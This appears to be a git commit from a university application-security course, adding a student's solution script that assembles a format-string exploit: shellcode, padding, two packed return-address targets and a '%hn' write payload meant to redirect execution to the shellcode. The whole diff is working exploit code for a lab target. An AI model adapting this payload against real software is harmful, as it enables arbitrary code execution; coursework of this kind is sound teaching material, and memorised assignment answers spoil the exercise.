2b831b2bebbc7a6f9106bf9b60f650630fa0492e
Brad Palagi <bpalagi2@illinois.edu>
2022-09-15 01:28:56 -0500

    1.2.9 done

--- AppSec/1.2.9.py
+++ AppSec/1.2.9.py
@@ -5,3 +5,15 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+ebp = 0xfffefdd8
+shellcodeAddr = 0xfffef5d0 # 0xf5d0 - 0x58 = 0xf578 = decimal 62840
+
+
+ADDR1 = ebp+6 #RetAddr with offset for short
+ADDR2 = ebp+4 #RetAddr
+padding = b"\x69"
+
+
+# Shellcode is 23 bytes, pad 1 byte to make total divisible by 24
+
+sys.stdout.buffer.write(shellcode + padding + pack('<I', ADDR1) + pack('<I', ADDR2) + b"%62896x%11$hn%2606x%10$hn")
